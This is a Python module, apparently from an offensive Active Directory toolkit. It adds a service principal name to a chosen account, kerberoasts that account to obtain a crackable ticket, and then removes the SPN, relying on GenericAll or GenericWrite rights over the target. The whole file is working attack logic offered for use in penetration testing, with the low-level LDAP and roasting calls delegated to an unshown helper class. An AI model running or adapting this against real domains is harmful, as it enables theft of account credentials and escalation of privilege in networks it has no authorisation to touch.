import os

from module import BaseModule
from tool import Tool


class SetSpn(BaseModule):
    path = "acl/setspn"
    description = "Add a SPN to a target account to make it kerberoastable. Requires GenericAll / GenericWrite."
    options = {
        "dc_ip": {
            "default": "",
            "description": "Domain Controller IP or host address. If empty. domain will be used.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "target_account": {
            "default": "",
            "description": "Target account to add the SPN to",
            "required": True,
        },
        "remove": {
            "default": "No",
            "description": "Remove the SPN instead of adding",
            "required": True,
            "boolean": True,
        },
        "kerberoast": {
            "default": "Yes",
            "description": "Whether to kerberoast the account after the SPN is added (If Yes, the SPN will also be removed)",
            "required": True,
            "boolean": True,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def _run(self, opts, pane):
        os.chdir(self.logs_dir)

        tool = Tool(self)
        tool.set_output_pane(pane)
        tool.title("Add SPN to the target account")
        if not tool.set_auth(from_module=True):
            return

        spn = (
            f"ldap/{opts.target_account.lower()}@{opts.domain.lower()}"
            if opts.remove == "No"
            else ""
        )

        if opts.remove == "Yes":
            tool.title("Remove SPN from target account")
            await tool.remove_spn(opts.target_account)
            return

        else:
            if not await tool.set_spn(opts.target_account, spn):
                return

            if opts.kerberoast == "Yes":
                tool.title("Kerberoast the target account")
                await tool.kerberoast(opts.target_account)

                tool.title("Remove SPN from target account")
                await tool.remove_spn(opts.target_account)

    async def run(self):
        if not self.validate_options():
            return

        await self._run(self.opts, self.pane_b)
